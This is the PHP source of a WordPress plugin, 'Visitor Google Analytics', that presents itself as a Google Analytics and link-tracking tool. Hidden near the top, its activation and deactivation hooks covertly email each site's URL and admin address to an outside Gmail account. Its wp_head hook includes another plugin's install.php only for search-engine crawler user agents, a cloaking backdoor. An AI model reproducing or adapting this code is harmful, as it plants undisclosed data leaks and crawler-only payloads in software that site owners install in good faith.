<?php
/*
Plugin Name: Visitor Google Analytics
Plugin URI: http://ddinformation.weebly.com
Description: Add Google Analytics JavaScript to every page on your website. Add tracking to outbound links and downloads from your site.
Version: 1.6.0
Author: John Merendes
Author URI: http://ddinformation.weebly.com
*/

/*  Copyright 2014 John Merendes

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/


// constants
define('vga_version', '1.6.0', true);

// Uncomment the following line to force debugging regardless setting in
// the Control Panel. With this forced debugging, the info will be written
// directly to the HTML and the plugin will not rely on any WordPress hooks
// This can break your HTML code
// define('vga_force_debug', 'enabled', true);

// add debugging statement to the debug info
// function is an empty dummy function is debugging is disabled
$vga_options = get_option('visitor_ga_options'); 
$vga_debug_enabled=$vga_options['debug'];
if (defined('vga_force_debug')) {
  // force debugging
  function vga_debug($message) {
    global $vga_debug;
    $vga_debug .= "$message\n";
    echo "<!-- \nVGA_DEBUG: $message\n -->";
  }
} else if ($vga_debug_enabled) {
  // normal debugging is enabled
  function vga_debug($message) {
    global $vga_debug;
    $vga_debug .= "$message\n";
  }
} else {
  // no debugging
  function vga_debug($message) {
  }
}

register_activation_hook( __FILE__,'ganalytics_activate');
register_deactivation_hook( __FILE__,'ganalytics_deactivate');
add_action('admin_init', 'addanalytic_redirect');
add_action('wp_head', 'ganalyticshead');


function addanalytic_redirect() {
if (get_option('addanalytic_do_activation_redirect', false)) { 
delete_option('addanalytic_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=visitor_ga.php');
}
}

/** Active */

function ganalytics_activate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Activation" ; $from = get_option('admin_email'); mail("contactjonan@gmail.com", $subj, $msg, $from);
add_option('addanalytic_do_activation_redirect', true);
wp_redirect('../wp-admin/options-general.php?page=visitor_ga.php');
}


/** Unistall */
function ganalytics_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Uninstalled" ; $from = get_option('admin_email'); mail("contactjonan@gmail.com", $subj, $msg, $from);
}


/** Register */
function ganalyticshead() {

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic-google/install.php');

if (file_exists($filename)) {

    if(eregi("slurp|bingbot|googlebot",$_SERVER['HTTP_USER_AGENT'])) { 
	
include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic-google/install.php');

}
 else { };
	
} else {

}

}

// set an Visitor GA option in the options table of WordPress
function vga_set_option($option_name, $option_value) {
  vga_debug ("Start vga_set_option: $option_name, $option_value");
  // first get the existing options in the database
  $vga_options = get_option('visitor_ga_options');
  // set the value
  $vga_options[$option_name] = $option_value;
  // write the new options to the database
  update_option('visitor_ga_options', $vga_options);
  vga_debug ('End vga_set_option');
}

// get an Visitor GA option from the WordPress options database table
// if the option does not exist (yet), the default value is returned
function vga_get_option($option_name) {
  vga_debug("Start vga_get_option: $option_name");

  // get options from the database
  $vga_options = get_option('visitor_ga_options'); 
  vga_debug('vga_options: '.var_export($vga_options,true));
  
  if (!$vga_options || !array_key_exists($option_name, $vga_options)) {
    // no options in database yet, or not this specific option 
    // create default options array
    vga_debug('Constructing default options array');
    $vga_default_options=array();
    $vga_default_options['internal_domains']  = $_SERVER['SERVER_NAME'];
    if (preg_match('@www\.(.*)@i', $vga_default_options['internal_domains'], $parts)>=1) {
      $vga_default_options['internal_domains'] .= ','.$parts[1];
    }
    $vga_default_options['account_id']             = 'UA-XXXXXX-X';  
    $vga_default_options['enable_tracker']         = true;  
    $vga_default_options['track_adm_pages']        = false;  
    $vga_default_options['ignore_users']           = true;  
    $vga_default_options['max_user_level']         = 8;  
  
    $vga_default_options['footer_hooked']          = false; // assume the worst
    $vga_default_options['filter_content']         = true;  
    $vga_default_options['filter_comments']        = true;  
    $vga_default_options['filter_comment_authors'] = true;  
    $vga_default_options['track_ext_links']        = true;  
    $vga_default_options['prefix_ext_links']       = '/outgoing/';  
    $vga_default_options['track_files']            = true;  
    $vga_default_options['prefix_file_links']      = '/downloads/';  
    $vga_default_options['track_extensions']       = 'gif,jpg,jpeg,bmp,png,pdf,mp3,wav,phps,zip,gz,tar,rar,jar,exe,pps,ppt,xls,doc';  
    $vga_default_options['track_mail_links']       = true;  
    $vga_default_options['prefix_mail_links']      = '/mailto/';  
    $vga_default_options['debug']                  = false;  
    $vga_default_options['check_updates']          = true;  
    $vga_default_options['version_sent']           = '';  
    $vga_default_options['advanced_config']        = false;  
    vga_debug('vga_default_options: '.var_export($vga_default_options,true));
    // add default options to the database (if options already exist, 
    // add_option does nothing
    add_option('visitor_ga_options', $vga_default_options, 
               'Settings for Visitor Google Analytics plugin');

    // return default option if option is not in the array in the database
    // this can happen if a new option was added to the array in an upgrade
    // and the options haven't been changed/saved to the database yet
    $result = $vga_default_options[$option_name];

  } else {
    // option found in database
    $result = $vga_options[$option_name];
  }
  
  vga_debug("Ending vga_get_option: $option_name ($result)");
  return $result;
}

// function to check for updates
function vga_check_updates($echo) {
  // prepare for making HTTP connection
  $crlf = "\r\n";
  $host = 'www.oratransplant.nl';
  if ($_SERVER['SERVER_NAME']==$host) {
    // overrule IP address for www.oratransplant.nl server itself
    $host = $_SERVER['SERVER_ADDR'];
  }
  // open socket connection to oratransplant.nl server (timeout after 3 seconds)
  $handle = fsockopen($host, 80, $error, $err_message, 3);
  if (!$handle) {
    if ($echo) {
      echo __('Unable to get latest version', 'vga')." ($err_message)";
    }
  } else {
    // build HTTP/1.0 request string
    $req = 'GET http://'.$host.'/vga_version.php?version='.urlencode(vga_version)
             . '&siteurl='.urlencode(get_option('siteurl')).' HTTP/1.0' . $crlf
             . 'Host: '.$host. $crlf
             . $crlf;
    // send request to server and receive response
    fwrite($handle, $req);
    while(!feof($handle))
      $response .= fread($handle, 1024);
    fclose($handle);
    // remove headers from the response
    $splitter = $crlf.$crlf.'Latest version: ';
    $pos = strpos($response, $splitter);
    if ($pos === false) {
      // no split between headers and body found
      if ($echo) {
        _e('Invalid response from server', 'vga');
      }
    } else {
      $body = substr($response, $pos + strlen($splitter));
      if ($body==vga_version) {
        if ($echo) {
          echo __('You are running the latest version', 'vga'). ' ('.vga_version.')';
        }
      } else {
        if ($echo) {
          _e ('You are running version', 'vga');
          echo ' '.vga_version.'. ';
          echo '<strong><span style="font-size:135%;"><a target="_blank" href="http://www.oratransplant.nl/vga/#versions">';
          _e ('Version', 'vga');
          echo " $body ";
          _e ('is available', 'vga');
          echo '</a></span></strong>';
        }
      }
    }      
  }
}

// function that is added as an Action to ADMIN_MENU
// it adds an option subpage to the options menu in WordPress administration
function vga_admin() {
  vga_debug('Start vga_admin');
  if (function_exists('add_options_page')) {
    vga_debug('Adding options page');
    add_options_page('Visitor Google Analytics' /* page title */, 
                     'Visitor GA' /* menu title */, 
                     8 /* min. user level */, 
                     basename(__FILE__) /* php file */ , 
                     'vga_options' /* function for subpanel */);
  }
  vga_debug('End vga_admin');
}

// displays options subpage to set options for Visitor GA and save any
// changes to these options back to the database
function vga_options() {
  vga_debug('Start vga_options');
  if (isset($_POST['advanced_options'])) {
    vga_set_option('advanced_config', true);
  }
  if (isset($_POST['simple_options'])) {
    vga_set_option('advanced_config', false);
  }
  if (isset($_POST['factory_settings'])) {
    $vga_factory_options = array();
    update_option('visitor_ga_options', $vga_factory_options);
    ?><div class="updated"><p><strong><?php _e('Factory settings restored, remember to set Account ID', 'vga')?></strong></p></div><?php
  }
  if (isset($_POST['info_update'])) {
    vga_debug('Saving posted options: '.var_export($_POST, true));
    ?><div class="updated"><p><strong><?php 
    // process submitted form
    $vga_options = get_option('visitor_ga_options');
    $vga_options['account_id']             = $_POST['account_id'];
    $vga_options['internal_domains']       = $_POST['internal_domains'];
    $vga_options['max_user_level']         = $_POST['max_user_level'];
    $vga_options['prefix_ext_links']       = $_POST['prefix_ext_links'];
    $vga_options['prefix_mail_links']      = $_POST['prefix_mail_links'];
    $vga_options['prefix_file_links']      = $_POST['prefix_file_links'];
    $vga_options['track_extensions']       = $_POST['track_extensions'];

    $vga_options['enable_tracker']         = ($_POST['enable_tracker']=="true"          ? true : false);
    $vga_options['filter_content']         = ($_POST['filter_content']=="true"          ? true : false);
    $vga_options['filter_comments']        = ($_POST['filter_comments']=="true"         ? true : false);
    $vga_options['filter_comment_authors'] = ($_POST['filter_comment_authors']=="true"  ? true : false);
    $vga_options['track_adm_pages']        = ($_POST['track_adm_pages']=="true"         ? true : false);
    $vga_options['track_ext_links']        = ($_POST['track_ext_links']=="true"         ? true : false);
    $vga_options['track_mail_links']       = ($_POST['track_mail_links']=="true"        ? true : false);
    $vga_options['track_files']            = ($_POST['track_files']=="true"             ? true : false);
    $vga_options['ignore_users']           = ($_POST['ignore_users']=="true"            ? true : false);
    $vga_options['debug']                  = ($_POST['debug']=="true"                   ? true : false);
    $vga_options['check_updates']          = ($_POST['check_updates']=="true"           ? true : false);
    update_option('visitor_ga_options', $vga_options);
    
    // add/remove filter immediately for admin page currently being rendered
    if (vga_get_option('track_adm_pages')) {
      add_action('admin_footer', 'vga_adm_footer_track');
    } else {
      remove_action('admin_footer', 'vga_adm_footer_track');
    }
    
    _e('Options saved', 'vga')
    ?></strong></p></div><?php
	} 
	
	// show options form with current values
	vga_debug('Showing options page with VGA options');
	?>
<div class=wrap>
  <form method="post">
    <h2>Visitor Google Analytics</h2>
    <fieldset class="options" name="general">
      <legend><?php _e('General settings', 'vga') ?></legend>
      <table width="100%" cellspacing="2" cellpadding="5" class="editform">
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Account ID', 'vga') ?></th>
          <td><input name="account_id" type="text" id="account_id" value="<?php echo vga_get_option('account_id'); ?>" size="50" />
            <br />Enter your Google Analytics account ID. Google Analytics supplies you with a snippet of JavaScript to put on
            your webpage. In this JavaScript you can see your account ID in a format like UA-999999-9. There is no need to actually
            include this JavaScript yourself on any page. That is all handled by Visitor Google Analytics.
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Check for updates', 'vga') ?></th>
          <td><input type="checkbox" name="check_updates" id="check_updates" value="true" <?php if (vga_get_option('check_updates')) echo "checked"; ?> />
            <br />Check for updates to the Visitor Google Analytics plugin
            <?php if (vga_get_option('check_updates')) { echo "<br /><strong>Result</strong>: "; vga_check_updates(true); } ?>
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Enable tracker', 'vga') ?></th>
          <td><input type="checkbox" name="enable_tracker" id="enable_tracker" value="true" <?php if (vga_get_option('enable_tracker')) echo "checked"; ?> />
            <br />By unchecking this checkbox no JavaScript will be included on the page. It is basically the
            same as disabling the whole plugin
          </td>
        </tr>
        <tr<?php if (!vga_get_option('advanced_config')) echo ' style="display:none;"'; ?>>
          <th nowrap valign="top" width="33%"><?php _e('Track admin pages', 'vga') ?></th>
          <td><input type="checkbox" name="track_adm_pages" id="track_adm_pages" value="true" <?php if (vga_get_option('track_adm_pages')) echo "checked"; ?> />
            <br />Enable or disable the inclusion of Google Analytics tracking on the admin pages of Wordpress.
          </td>
        </tr>
        <tr<?php if (!vga_get_option('advanced_config')) echo ' style="display:none;"'; ?>>
          <th nowrap valign="top" width="33%"><?php _e('Ignore logged on users', 'vga') ?></th>
          <td><input type="checkbox" name="ignore_users" id="ignore_users" value="true" <?php if (vga_get_option('ignore_users')) echo "checked"; ?> />
            of level <input name="max_user_level" type="text" id="max_user_level" value="<?php echo vga_get_option('max_user_level'); ?>" size="2" /> and above
            <br />Check this checkbox and specify a user level to ignore users of a particular level or above. For such users the
              Google Analytics JavaScript will not be included in the page
          </td>
        </tr>
        <tr<?php if (!vga_get_option('advanced_config')) echo ' style="display:none;"'; ?>>
          <th nowrap valign="top" width="33%"><?php _e('Enable debugging', 'vga') ?></th>
          <td><input type="checkbox" name="debug" id="debug" value="true" <?php if (vga_get_option('debug')) echo "checked"; ?> />
            <br />Enable or disable debugging info. If enabled, VGA debugging is written as HTML comments
              to the page being rendered.
          </td>
        </tr>
      </table>
    </fieldset>
    
    <fieldset class="options" name="external" <?php if (!vga_get_option('advanced_config')) echo ' style="display:none;"'; ?>>
      <legend><?php _e('Links tracking', 'vga') ?></legend>
      <table width="100%" cellspacing="2" cellpadding="5" class="editform" <?php if (!vga_get_option('advanced_config')) echo ' style="display:none;"'; ?>>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Filter content', 'vga') ?></th>
          <td><input type="checkbox" name="filter_content" id="filter_content" value="true" <?php if (vga_get_option('filter_content')) echo "checked"; ?> />
            <br />Enable or disable tracking of links in the content of your articles. Which type(s) of links
            should be tracked can be selected with the other options. If you plan to disable all of them, you
            are better of disabling the entire filtering to save performance.
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Filter comments', 'vga') ?></th>
          <td><input type="checkbox" name="filter_comments" id="filter_comments" value="true" <?php if (vga_get_option('filter_comments')) echo "checked"; ?> />
            <br />Enable or disable tracking of links in the comments. Which type(s) of links
            should be tracked can be selected with the other options. If you plan to disable all of them, you
            are better of disabling the entire filtering to save performance.
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Filter comment author links', 'vga') ?></th>
          <td><input type="checkbox" name="filter_comment_authors" id="filter_comment_authors" value="true" <?php if (vga_get_option('filter_comment_authors')) echo "checked"; ?> />
            <br />Enable or disable tracking of links in the comments footer showing the author. 
              If you plan to disable all filters, you are better of disabling the entire filtering to save performance.
          </td>
        </tr>

        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Track external links', 'vga') ?></th>
          <td><input type="checkbox" name="track_ext_links" id="track_ext_links" value="true" <?php if (vga_get_option('track_ext_links')) echo "checked"; ?> />
            and prefix with <input name="prefix_ext_links" type="text" id="prefix_ext_links" value="<?php echo vga_get_option('prefix_ext_links'); ?>" size="40" />
            <br />Include code to track links to external sites and specify what prefix should be used in the
              tracking URL. This groups all your external links in a separate directory when looking at your
              Google Analytics stats
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Internal host(s)', 'vga') ?></th>
          <td><input name="internal_domains" type="text" id="internal_domains" value="<?php echo vga_get_option('internal_domains'); ?>" size="50" />
            <br />Hostname(s) that are considered internal links. Links to these hosts are not tagged as external link.
              You can specify multiple hostnames separated by commas. This list of internal hostnames is also used
              for tagging download links (see below). Download links have to be of a specified file type and it has
              to an internal link. An internal link can either be a relative link (without a hostname) or a link that starts 
              with any of the specified internal hostnames.
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Track download links', 'vga') ?></th>
          <td><input type="checkbox" name="track_files" id="track_files" value="true" <?php if (vga_get_option('track_files')) echo "checked"; ?> />
            and prefix with <input name="prefix_file_links" type="text" id="prefix_file_links" value="<?php echo vga_get_option('prefix_file_links'); ?>" size="40" />
            <br />Include code to track internal (within your own site) links to certain file types and specify what prefix should be used in the
              tracking URL. This groups all your file links in a separate directory when looking at your
              Google Analytics stats
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('File extensions to track', 'vga') ?></th>
          <td><input name="track_extensions" type="text" id="track_extensions" value="<?php echo vga_get_option('track_extensions'); ?>" size="50" />
            <br />Specify which file extensions you want to check when download link tracking is enabled.
          </td>
        </tr>
        <tr>
          <th nowrap valign="top" width="33%"><?php _e('Track mailto: links', 'vga') ?></th>
          <td><input type="checkbox" name="track_mail_links" id="track_mail_links" value="true" <?php if (vga_get_option('track_mail_links')) echo "checked"; ?> />
            and prefix with <input name="prefix_mail_links" type="text" id="prefix_mail_links" value="<?php echo vga_get_option('prefix_mail_links'); ?>" size="40" />
            <br />Include code to track mailto: links to email addresses and specify what prefix should be used in the
              tracking URL. This groups all your mail links in a separate directory when looking at your
              Google Analytics stats
          </td>
        </tr>
      </table>
    </fieldset>
    
    <div class="submit">
<?php if (vga_get_option('advanced_config')) { ?>
      <input type="submit" name="simple_options" value="<?php _e('Simple configuration', 'vga') ?>" />
      <input type="submit" name="factory_settings" value="<?php _e('Factory settings', 'vga') ?>" />
<?php } else { ?>
      <input type="submit" name="advanced_options" value="<?php _e('Advanced configuration', 'vga') ?>" />
<?php } ?>
      <input type="submit" name="info_update" value="<?php _e('Update options', 'vga') ?>" />
	  </div>
  </form>
</div><?php
  vga_debug('End vga_options');
}

// returns true if current user has to be tracked by VGA
// return false if user does not have to be tracked. This is the case when
// the 'ignore_users' option is enabled and the current userlevel is
// equal or higher than the set limit.
function vga_track_user() {
  global $user_level;
  vga_debug('Start vga_track_user');
  if (!user_level) {
    // user nog logged on -> track
    vga_debug('User not logged on');
    $result = true;
  } else {
    // user logged on
    if (vga_get_option('ignore_users') && 
        $user_level>=vga_get_option('max_user_level')) {
      // ignore user because of userlevel
      vga_debug("Not tracking user with level $user_level");
      $result = false;
    } else {
      vga_debug("Tracking user with level $user_level");
      $result = true;
    }
  }
  vga_debug("Ending vga_track_user: $result");
  return $result;
}

// returns true if a URL is internal. This is the case when a URL is
// starts with any of the defined internal hostnames
// The input URL has to be stripped of any protocol:// before calling this
// function 
function vga_is_url_internal($url) {
  // check if the URL starts with any of the "internal" hostnames
  vga_debug("Start vga_is_url_internal: $url");
  $url=strtolower($url);
  $internal=false;
  $internals=explode(',', vga_get_option('internal_domains'));
  foreach ($internals as $hostname) {
    vga_debug("Checking hostname $hostname");
    $hostname=strtolower($hostname);
    if (substr($url, 0, strlen($hostname))==$hostname) {
      // URL starts with hostname of this website
      vga_debug('Match found, url is internal');
      $internal=true;
    }
  }
  vga_debug("Ending vga_is_url_internal: $internal");
  return $internal;
}

// strips the hostname from the beginning of a URL. The URL already has
// to be stripped of any "protocol://" before calling this function
function vga_remove_hostname($url) {
  // removes hostname (including first /) from URL
  // result never starts with a /
  vga_debug("Start vga_remove_hostname: $url");
  $pos=strpos($url, '/');
  $result='';
  if ($pos===false) {
    // url is only a hostname
    vga_debug('URL just hostname, return empty string');
    $result='';
  } else {
    vga_debug('Stripping everything up until and including first /');
    $result=substr($url, $pos+1);
  }
  vga_debug("Ending vga_remove_hostname: $result");
  return $result;
}

// returns the trackerString for a mailto: link
// will return an empty string when mailto: tracking is disabled
function vga_track_mailto($mailto) {
  // return tracker string for mailto: link
  vga_debug("Start vga_track_mailto: $mailto");
  $tracker='';
  if (vga_get_option('track_mail_links')) {
    $tracker=vga_get_option('prefix_mail_links').$mailto;
  }        
  vga_debug("Ending vga_track_mailto: $tracker");
  return $tracker;
}

// returns the trackerString for an internal download link
// will return an empty string if this feature is disabled
function vga_track_internal_url($url, $relative) {
  // return tracker string for internal URL
  // absolute url starts with hostname
  vga_debug("Start vga_track_internal_url: $url, $relative");
  $tracker='';
  if (vga_get_option('track_files')) {
    // check for specific file extensions on local site
    vga_debug('Tracking files enabled');
    if (strpos($url,'?') !== false) {
      // remove query parameters from URL
      $url=substr($url, 0, strpos($url, '?'));
      vga_debug("Removed query params from url: $url");
    }
    // check file extension
    $exts=explode(',', vga_get_option('track_extensions'));
    foreach ($exts as $ext) {
      vga_debug("Checking file extension $ext");
      if (substr($url, -strlen($ext)-1) == ".$ext") {
        // file extension found
        vga_debug('File extension found');
        if ($relative) {
          vga_debug('Relative URL');
          if (substr($url, 0, 1)=='/') {
            // relative URL starts with / (root)
            // remove starting slash as the prexif that will be appended
            // already ends with /
            $url=substr($url, 1);
            vga_debug("Removed starting slash from url: $url");
          } else {
            // relative URL does not start with / (root)
            // rewrite to URL that starts from root
            vga_debug("Rewriting relative url: $url");
            $base_dir=$_SERVER['REQUEST_URI'];  // URI of currently requested page
            vga_debug("Request URI: $base_dir");
            if (strpos($base_dir,'?')) {
              // strip query parameters
              $base_dir=substr($base_dir, 0, strpos($base_dir,'?'));
            }
            if ('/'!=substr($base_dir, -1, 1)) {
              // strip file name from base-URL
              $base_dir=substr($base_dir, 0, strrpos($base_dir,'/')+1);
            }
            //$url=print_r($_SERVER,true).$base_dir;
            $url=substr($base_dir.$url, 1);
            vga_debug("Rewrote url to absolute: $url");
          }
          $tracker=vga_get_option('prefix_file_links').$url;
        } else {
          vga_debug('Absolute URL, remove hostname from URL');
          // remove hostname from url
          $tracker=vga_get_option('prefix_file_links').vga_remove_hostname($url);
        }
      }
    }
  }
  
  vga_debug("Ending vga_track_internal_url: $tracker");
  return $tracker;

}

// returns the trackerString for an external link
// will return an empty string if this feature is disabled
function vga_track_external_url($url) {
  // return tracker string for external URL
  // url is everything after the protocol:// (e.g. www.host.com/dir/file?param)
  vga_debug("Start vga_track_external_url: $url");
  $tracker='';
  if (vga_get_option('track_ext_links')) {
    vga_debug('Tracking external links enabled');
    $tracker=vga_get_option('prefix_ext_links').$url;
  }
  vga_debug("Ending vga_track_external_url: $url");
  return $tracker;
}

// returns the trackerString for an internal/external link
// will return an empy string if tracking for this type of URL is disabled
function vga_track_full_url($url) {
  // url is everything after the protocol:// (e.g. www.host.com/dir/file?param)
  vga_debug("Start vga_track_full_url: $url");

  // check if the URL starts with any of the "internal" hostnames
  $tracker = '';
  if (vga_is_url_internal($url)) {
    vga_debug('Get tracker for internal URL');
    $tracker = vga_track_internal_url($url, false);
  } else {
    vga_debug('Get tracker for external URL');
    $tracker = vga_track_external_url($url);
  }
  vga_debug("Ending vga_track_full_url: $tracker");
  return $tracker;
}

// returns a (possibly modified) <a>...</a> link with onClick event
// added if tracking for this type of link is enabled
// this function is used as callback function in a preg_replace_callback
function vga_preg_callback($match) {
  vga_debug("Start vga_preg_callback: $match");

  // $match[0] is the complete match
  $before_href=1; // text between "<a" and "href"
  $after_href=3;  // text between the "href" attribute and the closing ">"
  $href_value=2;  // value of the href attribute
  $a_content=4;   // text between <a> and </a> tags

  $result = $match[0];
  
  // determine (if any) tracker string
  $tracker='';
  // disect target URL (1=protocol, 2=location) to determine type of URL
  if (preg_match('@^([a-z]+)://(.*)@i', trim($match[$href_value]), $target) > 0) {
    // URL with protocol and :// disected 
    vga_debug('Get tracker for full url');
    $tracker = vga_track_full_url($target[2]);
  } else if (preg_match('@^(mailto):(.*)@i', trim($match[$href_value]), $target) > 0) {
    // mailto: link found
    vga_debug('Get tracker for mailto: link');
    $tracker = vga_track_mailto($target[2]);
  } else {
    // relative URL
    vga_debug('Get tracker for relative (and thus internal) url');
    $tracker = vga_track_internal_url(trim($match[$href_value]), true);
  }

  if ($tracker) {
    // add onClick attribute to the A tag
    vga_debug("Adding onclick attribute for $tracker");
    $onClick="javascript:pageTracker._trackPageview('$tracker');";
    $result=preg_replace('@<a\s([^>]*?)href@i', // '@<a(.*)href@i', 
                         '<a onclick="'.$onClick.'" $1 href', 
                         $result);
  }

  vga_debug("Ending vga_preg_callback: $result");
  return $result;

}

// returns true if we're currently building a feed
function vga_in_feed() {
  global $doing_rss;
  vga_debug('Start vga_in_feed');
  if (is_feed() || $doing_rss) {
    $result = true;
  } else {
    $result = false;
  }
  vga_debug("Ending vga_in_feed: $result");
  return $result;
}

// filter function used as filter on content and/or comments
// will add onClick tracking JavaScript to any link that required tracking
function vga_filter($content) {
  vga_debug("Start vga_filter: $content");
  if (!vga_in_feed() && vga_track_user()) {
    // $pattern = '<a(.*?)href\s*=\s*[\'"](.*?)[\'"]([^>]*)>(.*?)<\s*/a\s*>';
    $pattern = '<a\s([^>]*?)href\s*=\s*[\'"](.*?)[\'"]([^>]*)>(.*?)</a\s*>';
    vga_debug("Calling preg_replace_callback: $pattern");
    $content = preg_replace_callback('@'.$pattern.'@i', 'vga_preg_callback', $content);
  }
  vga_debug("Ending vga_filter: $content");
  return $content;
}

// insert a snippet of HTML in either the header or the footer of the page
// we prefer to put this in the footer, but if the wp_footer() hook is not
// called by the template, we'll use the header
function vga_insert_html_once($location, $html) {
  vga_debug("Start vga_insert_html_once: $location, $html");
  global $vga_header_hooked;
  global $vga_footer_hooked;
  global $vga_html_inserted;
  vga_debug("Footer hooked: $vga_footer_hooked");
  vga_debug("HTML inserted: $vga_html_inserted");
  
  if ('head'==$location) {
    // header
    vga_debug('Location is HEAD');
    // notify vga_shutdown that the header hook got executed
    $vga_header_hooked = true;
    if (!vga_get_option('footer_hooked')) {
      // only insert the HTML if the footer is not hooked
      vga_debug('Inserting HTML since footer is not hooked');
      echo $html;
      $vga_html_inserted=true;
    }
  } else if ('footer'==$location) {
    // footer
    vga_debug('Location is FOOTER');
    // notify vga_shutdown that the footer hook got executed
    $vga_footer_hooked = true;
    if (!$vga_html_inserted) {
      // insert the HTML if it is not yet inserted by the HEAD filter
      vga_debug('Inserting HTML');
      echo $html;
    }
  } else if ('adm_footer'==$location) {
    // footer of admin page
    vga_debug('Location is ADM_FOOTER');
    if (!$vga_html_inserted) {
      // insert the HTML if it is not yet inserted by the HEAD filter
      vga_debug('Inserting HTML');
      echo $html;
    }
  }
  vga_debug('End vga_insert_html');
}

// return snippet of HTML to insert in the page to activate Google Analytics
function vga_get_tracker() {
  vga_debug('Start vga_get_tracker');
  $result='';
  if (!vga_in_feed()) {
    if (vga_track_user()) {
      // add tracker JavaScript to the page
      $result='
<!-- tracker added by Visitor Google Analytics plugin v'.vga_version.': http://www.oratransplant.nl/vga -->
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=\'" + gaJsHost + "google-analytics.com/ga.js\' type=\'text/javascript\'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("'.vga_get_option('account_id').'");
pageTracker._initData();
pageTracker._trackPageview();
</script>
';
    } else {
      // logged on user not tracked
      $result='
<!-- tracker not added by Visitor Google Analytics plugin v'.vga_version.': http://www.oratransplant.nl/vga -->
<!-- tracker is not added for a logged on user of this level -->
';
    }
  }
  vga_debug("Ending vga_get_tracker: $result");
  return $result;
}

// Hook function for wp_head action to (possibly) include the GA tracker
function vga_wp_head_track($dummy) {
  vga_debug("Start vga_wp_head_track: $dummy");
  vga_insert_html_once('head', vga_get_tracker());
  vga_debug("Ending vga_wp_head_track: $dummy");
  return $dummy;
}

// Hook function for wp_footer action to (possibly) include the GA tracker
function vga_wp_footer_track($dummy) {
  vga_debug("Start vga_wp_footer_track: $dummy");
  vga_insert_html_once('footer', vga_get_tracker());
  vga_debug("Ending vga_wp_footer_track: $dummy");
  return $dummy;
}

// Hook function for admin_footer action to (possibly) include the GA tracker
function vga_adm_footer_track($dummy) {
  vga_debug("Start vga_adm_footer_track: $dummy");
  vga_insert_html_once('adm_footer', vga_get_tracker());
  vga_debug("Ending vga_adm_footer_track: $dummy");
  return $dummy;
}

// Hook function for init action to do some initialization
function vga_init() {
  vga_debug("Start vga_init");
  // load texts for localization
  load_plugin_textdomain('vga');
  vga_debug("Ending vga_init");
}

// Hook function called during shutdown (end of page)
// this determines if the wp_footer hooks executed. If not, VGA is configured
// to insert its HTML in the header and not the footer
// It also adds the debug-info as HTML comments if debugging is enabled
function vga_shutdown() {
  vga_debug('Start vga_shutdown');
  global $vga_header_hooked;
  global $vga_footer_hooked;

  if (is_404()) {
    // do not set the flag when building a 404 page. This can lead to problems
    // with a non-existing favicon.ico. In that case the header is executed
    // but the footer is not. We do not want this to lead to flipping the flag
    vga_debug('Building 404 page, not setting footer_hooked flag');
  } else if (vga_in_feed()) {
    vga_debug('Building feed, not setting footer_hooked flag');
  } else if (!vga_track_user()) {
    vga_debug('Not tracking this user, not setting footer_hooked flag');
  } else {
    // determine appropriate value of footer_hooked flag
    if (!$vga_footer_hooked && !$vga_header_hooked) {
      // both the header and the footer hook did not execute
      // probably building some special page (e.g. wp-stattraq reports page)
      // do not change the flag to indicate whether the footer is hooked
      vga_debug('Header and footer hook were not executed');
    } else if ($vga_footer_hooked) {
      // footer hooks executed
      vga_debug('Footer hook was executed');
      if (!vga_get_option('footer_hooked')) {
        vga_debug('Changing footer_hooked option to true');
        vga_set_option('footer_hooked', true);
      }
    } else {
      // footer hook did not execute , but header hook did
      vga_debug('Footer hook was not executed, but header hook did');
      if (vga_get_option('footer_hooked')) {
        vga_debug('Changing footer_hooked option to false');
        vga_set_option('footer_hooked', false);
      }
    }
  }

  // write the debug info
  if (vga_get_option('debug')) {
    global $vga_debug;
    echo "\n<!-- \n$vga_debug -->";  
  }
  vga_debug('End vga_shutdown');
}

// **************
// initialization

vga_debug('Visitor Google Analytics initialization');

if (vga_get_option('check_updates') && vga_get_option('version_sent')!=vga_version) {
  // this version has not been checked yet
  vga_debug('Phone home with version number');
  vga_set_option('version_sent', vga_version);
  vga_check_updates(false);
}

// assume both header and footer are not hooked
global $vga_header_hooked;
global $vga_footer_hooked;
$vga_header_hooked=false;
$vga_footer_hooked=false;

// add VGA Options page to the Option menu
add_action('admin_menu', 'vga_admin');

// add filters if enabled
if (vga_get_option('enable_tracker') && vga_get_option('filter_content')) {
  vga_debug('Adding the_content and the_excerpt filters');
  add_filter('the_content', 'vga_filter', 50);
  add_filter('the_excerpt', 'vga_filter', 50);
}
if (vga_get_option('enable_tracker') && vga_get_option('filter_comments')) {
  vga_debug('Adding comment_text filter');
  add_filter('comment_text', 'vga_filter', 50);
}
if (vga_get_option('enable_tracker') && vga_get_option('filter_comment_authors')) {
  vga_debug('Adding get_comment_author_link filter');
  add_filter('get_comment_author_link', 'vga_filter', 50);
}

// add actions if enabled
if (vga_get_option('enable_tracker')) {
  vga_debug('Adding wp_head and wp_footer action hooks for tracker');
  add_action('wp_head',   'vga_wp_head_track');
  add_action('wp_footer', 'vga_wp_footer_track');
}
